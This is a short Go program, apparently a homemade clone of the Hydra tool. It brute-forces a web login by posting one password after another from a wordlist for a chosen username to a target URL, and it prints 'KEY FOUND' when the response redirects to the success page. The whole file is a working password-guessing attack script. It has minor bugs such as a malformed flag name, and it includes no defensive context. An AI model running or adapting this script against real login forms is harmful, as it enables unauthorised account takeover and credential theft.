package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	// Command-line arguments
	username := flag.String("l", "", "Username to test")
	passwordList := flag.String("P", "", "Path to password list")
	url := flag.String("url", "", "Target URL")
	successRedirect := flag.String("--redirect", "", "Success redirect URL")
	flag.Parse()

	if *username == "" || *passwordList == "" || *url == "" || *successRedirect == "" {
		fmt.Println("Usage: hydra2.go -l username -P passwordlist url --redirect success_redirect_url")
		os.Exit(1)
	}

	// Open the password file
	file, err := os.Open(*passwordList)
	if err != nil {
		fmt.Printf("Error opening password list: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	// Create an HTTP client
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Prevent automatic redirects
		},
	}

	// Read passwords and attempt login
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()

		// Create a POST request
		data := fmt.Sprintf("username=%s&password=%s", *username, password)
		req, err := http.NewRequest("POST", *url, strings.NewReader(data))
		if err != nil {
			fmt.Printf("Error creating request: %v\n", err)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// Send the request
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Error sending request: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		// Check for redirect to success URL
		if resp.StatusCode == http.StatusFound && resp.Header.Get("Location") == *successRedirect {
			fmt.Printf("KEY FOUND: %s\n", password)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading password list: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("KEY NOT FOUND")
}
